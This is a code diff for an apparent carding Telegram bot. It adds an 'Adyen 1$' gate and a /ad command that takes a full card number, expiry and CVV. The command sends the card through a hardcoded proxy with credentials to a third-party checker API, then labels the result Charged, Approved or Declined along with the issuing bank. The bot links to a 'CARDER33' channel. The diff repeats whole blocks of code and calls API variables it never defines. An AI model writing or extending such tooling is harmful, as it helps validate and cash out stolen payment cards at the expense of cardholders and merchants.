@@ -647,6 +647,8 @@ async def braintree_examples_handler(update: Update, context: ContextTypes.DEFAU
             disable_web_page_preview=True
         )
 
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+
 async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the 'Charge' button."""
     q = update.callback_query
@@ -674,7 +676,8 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             InlineKeyboardButton("🏦 Authnet 1.0$", callback_data="authnet36_gate")
         ],
         [
-            InlineKeyboardButton("🌊 Ocean Payments 4$", callback_data="ocean_gate")
+            InlineKeyboardButton("🌊 Ocean Payments 4$", callback_data="ocean_gate"),
+            InlineKeyboardButton("💳 Adyen 1$", callback_data="adyen_gate")  # New button in second column
         ],
         [
             InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
@@ -682,7 +685,6 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
     ])
 
     try:
-        # Correctly use edit_message_caption
         await q.edit_message_caption(
             caption=text,
             parse_mode=ParseMode.HTML,
@@ -696,6 +698,7 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             reply_markup=keyboard,
             disable_web_page_preview=True
         )
+
 
 
 
@@ -732,6 +735,44 @@ async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             reply_markup=InlineKeyboardMarkup(keyboard),
             disable_web_page_preview=True
         )
+
+async def adyen_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the 'Adyen 1$' button."""
+    q = update.callback_query
+    await q.answer()
+
+    text = (
+        "✦━━━━━━━━━━━━━━✦\n"
+        "      💳 <b>Adyen 1$</b>\n"
+        "✦━━━━━━━━━━━━━━✦\n\n"
+        "• <code>/ad</code> - <i>Check a single card on Adyen $1</i>\n"
+        "  Example:\n"
+        "  <code>/ad 1234567890123456|12|2026|123</code>\n\n"
+        "⚡ Use carefully, each check deducts credits.\n\n"
+        "✨ <b>Status</b> - <i>Active</i> ✅"
+    )
+
+    keyboard = [
+        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
+        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
+    ]
+
+    try:
+        # Edit the existing message caption
+        await q.edit_message_caption(
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Exception as e:
+        logger.warning(f"Failed to edit message, sending a new one: {e}")
+        await q.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            disable_web_page_preview=True
+        )
+
 
 async def ocean_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the 'Ocean Payments 4$' button."""
@@ -1007,6 +1048,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "shopify10_gate": shopify10_gate_handler,
         "authnet36_gate": authnet36_gate_handler,
         "ocean_gate": ocean_gate_handler,          # ✅ Ocean Payments 4$
+        "adyen_gate": adyen_gate_handler,          # ✅ Added Adyen 1$
         "stripe_examples": stripe_examples_handler,
         "braintree_examples": braintree_examples_handler,
         "ds_lookup": ds_lookup_menu_handler,
@@ -1018,6 +1060,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await handler(update, context)
     else:
         await q.answer("⚠️ Unknown option selected.", show_alert=True)
+
 
 
 
@@ -3890,6 +3933,297 @@ async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+import aiohttp
+import json
+import logging
+import asyncio
+from datetime import datetime
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
+# Import DB helpers
+from db import get_user, update_user
+
+logger = logging.getLogger(__name__)
+
+# --- User cooldowns ---
+user_cooldowns = {}
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """Consume 1 credit from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+
+
+import aiohttp
+import json
+import logging
+import asyncio
+from datetime import datetime
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+import re
+
+# Import DB helpers
+from db import get_user, update_user
+
+logger = logging.getLogger(__name__)
+
+# --- User cooldowns ---
+user_cooldowns = {}
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """Consume 1 credit from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+# --- HC Processor ---
+import aiohttp
+import json
+import re
+import logging
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from db import get_user, update_user
+from bin import get_bin_info
+
+logger = logging.getLogger(__name__)
+
+# --- Config ---
+AUTOSH_AT_API = "https://autoshopify-dark.sevalla.app/index.php"
+DEFAULT_PROXY = "82.29.225.78:5933:juftilus:atasaxde44jl"
+AUTHNET_DEFAULT_SITE = "https://pizazzhair.com"
+
+
+async def process_ad(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
+    """
+    Process a /ad command: check Adyen card, display response and BIN info.
+    Gateway label = Adyen, Price = 1$
+    """
+    try:
+        user = update.effective_user
+
+        # --- Consume credit ---
+        if not await consume_credit(user.id):
+            await update.message.reply_text("❌ You don’t have enough credits left.")
+            return
+
+        # --- Extract card details ---
+        parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: /ad 1234567812345678|12|2028|123",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+        full_card = f"{cc}|{mm}|{yy}|{cvv}"
+
+        # --- Clickable bullet ---
+        BULLET_GROUP_LINK = "https://t.me/CARDER33"
+        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
+
+        # --- Initial processing message ---
+        processing_text = (
+            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
+            f"<pre><code>{full_card}</code></pre>\n\n"
+            f"{bullet_link} <b>Gateway ➵ 𝐀𝐝𝐲𝐞𝐧</b>\n"
+            f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
+        )
+
+        processing_msg = await update.message.reply_text(
+            processing_text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+        # --- API request ---
+        api_url = (
+            f"{ADYEN_API}"
+            f"?site={ADYEN_DEFAULT_SITE}"
+            f"&cc={full_card}"
+            f"&proxy={DEFAULT_PROXY}"
+        )
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
+                    api_response = await resp.text()
+        except asyncio.TimeoutError:
+            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
+            return
+        except Exception as e:
+            await processing_msg.edit_text(
+                f"❌ API request failed: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Parse API response ---
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            logger.error(f"API returned invalid JSON: {api_response[:300]}")
+            await processing_msg.edit_text(
+                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        response = data.get("Response", "Unknown")
+        gateway = "Adyen"
+        price = "1$"
+
+        # --- BIN lookup ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "Unknown"
+            country_flag = bin_details.get("country_emoji", "")
+        except Exception as e:
+            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
+            brand = issuer = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- Requester ---
+        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
+        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
+
+        # --- Developer Branding ---
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+        # --- Enhance response with emojis & dynamic header ---
+        display_response = escape(response)
+        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
+            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            header_status = "🔥 Charged"
+        elif "3D_AUTHENTICATION" in response.upper():
+            display_response += " 🔒"
+            header_status = "✅ Approved"
+        elif "CARD_DECLINED" in response.upper():
+            header_status = "❌ Declined"
+        elif "INVALID_CVC" in response.upper():
+            header_status = "✅ Approved"
+        elif "INSUFFICIENT_FUNDS" in response.upper():
+            display_response += " 💳"
+            header_status = "✅ Approved"
+        else:
+            header_status = "❌ Declined"
+
+        # --- Final formatted message ---
+        final_msg = (
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
+            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒅𝒚𝒆𝒏 {price}\n"
+            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
+            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{escape(issuer)}</code>\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{escape(country_name)} {country_flag}</code>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
+            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
+            "――――――――――――――――"
+        )
+
+        await processing_msg.edit_text(
+            final_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+    except Exception as e:
+        logger.exception("Error in processing /ad")
+        try:
+            await update.message.reply_text(
+                f"❌ Error: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+
+
+
+# --- Main /sh command ---
+import re
+
+# Assuming you have this regex pattern somewhere globally:
+CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
+
+async def ad_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+
+    # --- Cooldown check ---
+    if not await enforce_cooldown(user.id, update):
+        return
+
+    payload = None
+
+    # --- Check arguments ---
+    if context.args:
+        payload = " ".join(context.args).strip()
+
+    # --- If no args, check reply message ---
+    elif update.message.reply_to_message and update.message.reply_to_message.text:
+        match = CARD_REGEX.search(update.message.reply_to_message.text)
+        if match:
+            payload = match.group().strip()
+
+    # --- If still no payload ---
+    if not payload:
+        await update.message.reply_text(
+            "⚠️ Usage: <code>/ad card|mm|yy|cvv</code>\n"
+            "Or reply to a message containing a card.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # --- Run in background ---
+    asyncio.create_task(process_ad(update, context, payload))
 
 import asyncio
 import aiohttp
@@ -6913,6 +7247,7 @@ def register_commands(application):
         ("gen", gen),
         ("open", open_command),
         ("adcr", adcr_command),
+        ("ad", ad_command),
         ("bin", bin_lookup),
         ("fk", fk_command),
         ("vbv", vbv),
